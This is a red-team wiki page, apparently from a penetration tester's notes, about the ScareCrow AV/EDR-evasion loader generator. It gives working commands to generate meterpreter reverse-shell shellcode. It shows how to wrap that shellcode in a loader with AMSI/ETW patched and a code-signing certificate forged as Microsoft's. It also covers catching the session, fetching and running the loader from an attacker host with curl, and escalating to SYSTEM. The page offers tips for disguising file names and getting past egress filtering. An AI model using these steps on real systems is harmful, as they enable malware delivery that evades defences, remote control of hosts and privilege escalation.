---
title: "ScareCrow"
type: tool
tags: [windows, av-evasion, edr-evasion, payload, loader, defender, red-team, post-exploitation]
date_created: 2026-07-21
date_updated: 2026-07-21
sources: []
phase: postex
---

# ScareCrow

Repo: `https://github.com/optiv/ScareCrow` (Optiv, `@Tyl0us`)

## Purpose

ScareCrow is a payload-loader generator for **AV/EDR evasion**. You feed it raw shellcode (e.g. an
msfvenom meterpreter/beacon stub) and it emits a compiled loader (`.exe`/`.dll`/`.cpl`/…) that runs the
shellcode in memory while defeating the common static and behavioural defences: it **encrypts the
shellcode** (AES/ELZMA), **patches AMSI and ETW** in the loading process, adds a randomized sleep to dodge
sandbox timing, wraps everything in a benign-looking binary, and **signs it with a spoofed code-signing
certificate** for a domain you choose. The result is a loader that Windows Defender (and many EDRs) will
let touch disk and execute where a naked payload is deleted on write.

Its headline use in this wiki: when you hold `SeImpersonatePrivilege` on a Defender-protected host but every
standalone potato binary (GodPotato/PrintSpoofer/SigmaPotato) is signatured, ScareCrow gets you a
**Defender-clean in-memory meterpreter first**, and you then elevate with meterpreter `getsystem` (named-pipe
impersonation = the same primitive, in-memory, dropping nothing new). Solve Defender ONCE at the loader
instead of fighting it once per potato artifact. See [[windows-privesc]] "Potato attacks vs Defender/EDR".

## Installation

ScareCrow **compiles the loader with Go at runtime**, so a working Go toolchain is mandatory (not just the
prebuilt release binary). It also shells out to `openssl` + `osslsigncode` (cert forge/sign) and `garble`
(Go obfuscator, auto-fetched on first run), and uses `x86_64-w64-mingw32-gcc` for some output formats.

```bash
sudo apt install -y openssl osslsigncode mingw-w64
git clone https://github.com/optiv/ScareCrow
cd ScareCrow && go build ScareCrow.go        # produces the ./ScareCrow binary
```

- **Gotcha (Go):** a trimmed `/usr/bin/go` stub with **no GOROOT** fails with `cannot find GOROOT
  directory: 'go' binary is trimmed`. Point at the real toolchain:
  `export GOROOT=/usr/local/go PATH=/usr/local/go/bin:$PATH GOPATH=$HOME/go` before `go build` and before
  running ScareCrow (it invokes `go` to compile the loader).
- garble is fetched via `go install mvdan.cc/garble@latest` (ScareCrow does this itself if missing).

## Usage

```bash
# 1. raw x64 shellcode (meterpreter shown; Cobalt Strike/Sliver stubs work the same)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f raw -o beacon.bin
# 2. wrap it -> a signed, AMSI/ETW-patched loader
./ScareCrow -I beacon.bin -domain Microsoft.com
```

- `-I <file>` raw shellcode input. `-domain <fqdn>` forges the code-signing cert to impersonate that
  domain (`Microsoft.com`, `Cloudflare.com`, … pick something whose signed binaries are unremarkable).
- `-Loader binary|dll|control|excel|msiexec|wscript` output type (default `binary` = `.exe`). Rename the
  output to something benign (`Outlook.exe`, `lync.exe`, …).
- `-injection <pid>` / `-noamsi` / `-noetw` / `-sandbox` tune the loader; defaults already patch AMSI+ETW.
- Output is a self-contained loader printed at the end (e.g. `[+] Signed File Created` -> `lync.exe`).

Deliver + catch:

```bash
# attacker: catch the in-memory session
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <attacker>; set LPORT <port>; set ExitOnSession false; exploit -j"
# target (from a shell that holds SeImpersonate, e.g. an IIS app-pool user), over an allowed egress port:
curl http://<attacker>:445/lync.exe -o C:\Windows\Temp\lync.exe
C:\Windows\Temp\lync.exe
# meterpreter:  getsystem   (technique 5 = named-pipe impersonation; migrate -N winlogon.exe to stabilize)
```

## When to use / notes

- **SeImpersonate under Defender/EDR** -> loader-first (this tool) then `getsystem`, instead of dropping a
  signatured potato. Also any time you need a Defender-clean meterpreter/beacon on a Windows host.
- **Run the loader FROM the privileged-token shell** (the app-pool/service identity), not a low-priv
  interactive user, or `getsystem`'s impersonation has no token to steal. It often **fails the first run --
  just re-run**. The first session can die right after elevation -> `migrate` to a stable SYSTEM process.
- **Egress-restricted host:** fingerprint allowed OUTBOUND ports first (common survivors 53/80/443/445);
  stage the loader over one and catch the callback on another.
- **Lab first.** This is offensive tooling that trips detonation telemetry; build and test it in a lab,
  never straight onto a client box, and clean up the dropped loader afterward.
- **Alternatives / peers:** Donut (shellcode-from-PE), Sliver's stager, `execute-assembly` from an existing
  clean session, or fresh non-potato source-EoP (see [[windows-privesc]]). If ScareCrow's Go build is a
  fight, a manually-encrypted loader + AMSI patch achieves the same idea.

## See also
- [[windows-privesc]] · [[privesc-exploit-arsenal]] · [[windows-amsi-bypass]] · [[endpoint-detection-and-response]]
- [[metasploit]] (multi/handler, getsystem, kiwi) · [[peass]] (winPEAS has its own Defender-safe variants)
